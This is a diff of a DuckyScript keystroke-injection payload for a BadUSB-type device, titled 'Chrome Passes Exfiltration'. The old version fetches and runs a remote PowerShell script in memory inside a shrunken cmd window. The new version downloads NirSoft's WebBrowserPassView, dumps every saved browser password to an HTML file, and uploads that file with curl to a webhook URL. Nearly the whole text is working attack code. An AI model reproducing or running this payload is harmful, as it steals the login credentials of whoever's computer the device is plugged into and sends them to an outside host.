@@ -1,26 +1,42 @@
 REM ################################################################################################################
-REM # Title: Chrome Passes Exfiltration                                                                            #
+REM # Title: Chrome Passes Exfiltration based on UNC0V3R3D's wbpv method (UNC0V3R3D#8662 on Discord)               #
 REM # Description: This script appears to be attempting to retrieve saved login data from Google Chrome and        #
-REM send it to a specified webhook URL. The login data is decrypted using the ProtectedData class in the           #
-REM System.Security namespace, and the decrypted usernames and passwords are stored in an object called $data.     #
-REM The usernames and passwords are then sent to the webhook URL using an HTTP POST request. There are two methods # 
-REM of sending the data to the webhook shown in the script - the first sends the data as a string formed by        #
-REMconcatenating the usernames and passwords, and the second sends the data as a JSON object.                      #                                                     
+REM send it to a specified webhook URL.                                                                            #                                                   
 REM # Author: B4ph0m3th                                                                                            #
+REM Version:	1.0                                                                                                  #
+REM Description: Shows all saved Chrome passwords                                                                  #
+REM Category:	Passwords                                                                                            #
 REM ################################################################################################################
-REM @@ Opening the CMD
-GUI r 
+DELAY 900
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip
+ENTER
+DELAY 4000
+STRING wbpv28821@
+ENTER
+STRING .\WebBrowserPassView.exe; exit
+ENTER
+DELAY 2500
+CTRL A
+CTRL S
+DELAY 1000
+STRING export.html
+TAB
+STRING h
+ENTER
+DELAY 250
+ALT F4
+DELAY 250
+GUI r
 DELAY 500
-STRING cmd.exe
-ENTER 
-DELAY 750
-REM @@ Changing the color, risizing the CMD and executing the reverse shell in memory
-STRING cmd /C color FE&mode con:cols=18 lines=1&powershell "iex(iwr raw.githubusercontent.com/baph0m3th/FZ/main/Exfil/chromie.ps1)"
-DELAY 950
+STRING powershell
 ENTER
-REM @@ Minimizing the CMD
-ALT SPACE
-DOWN
-DOWN
-DOWN
+DELAY 900
+REM Replace <WEBHOOK URL> with your URL
+STRING $file = 'C:\temp\export.htm';$url = "<WEBHOOK URL>";Invoke-RestMethod -Uri $url -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$file" $url; exit
 ENTER
+
